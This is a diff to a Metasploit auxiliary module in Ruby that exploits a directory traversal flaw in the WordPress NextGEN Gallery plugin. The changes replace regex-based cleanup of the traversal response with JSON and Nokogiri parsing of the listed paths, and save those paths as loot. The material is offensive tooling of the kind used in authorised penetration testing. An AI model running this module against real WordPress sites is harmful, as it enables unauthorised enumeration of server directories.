@@ -4,6 +4,8 @@
 ##
 
 require 'msf/core'
+require 'json'
+require 'nokogiri'
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -76,6 +78,20 @@ class Metasploit3 < Msf::Auxiliary
     res.body.scan(/var browse_params = {"nextgen_upload_image_sec":"(.+)"};/).flatten.first
   end
 
+  def parse_paths(res)
+    begin
+      j = JSON.parse(res.body)
+    rescue JSON::ParserError => e
+      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
+      return []
+    end
+
+    html = j['html']
+    noko = Nokogiri::HTML(html)
+    links = noko.search('a')
+    links.collect { |e| normalize_uri("#{datastore['DIRPATH']}/#{e.text}") }
+  end
+
   def run_host(ip)
     vprint_status("#{peer} - Trying to login as: #{user}")
     cookie = wordpress_login(user, password)
@@ -114,22 +130,17 @@ class Metasploit3 < Msf::Auxiliary
       'cookie'    => cookie
     )
 
-    if res && res.code == 200 && res.body && res.body.to_s.length > 0
-      begin
-        results = JSON.parse(res.body)['html']
-      rescue JSON::ParserError
-        vprint_error("#{peer} - Unable to parse JSON")
-        return
-      end
+    if res && res.code == 200
 
-      res_new = results.gsub(/<u(.*)>/, '').gsub(/<\/ul>/, '').gsub(/<l(.*)"\/..\/..\/..\/../, '').gsub(/"(.*)i>/, '')
-      vprint_line("#{res_new}")
-      fname = datastore['FILEPATH']
+      paths = parse_paths(res)
+      vprint_line(paths * "\n")
+
+      fname = datastore['DIRPATH']
       path = store_loot(
         'nextgen.traversal',
         'text/plain',
         ip,
-        res_new,
+        paths,
         fname
       )
 
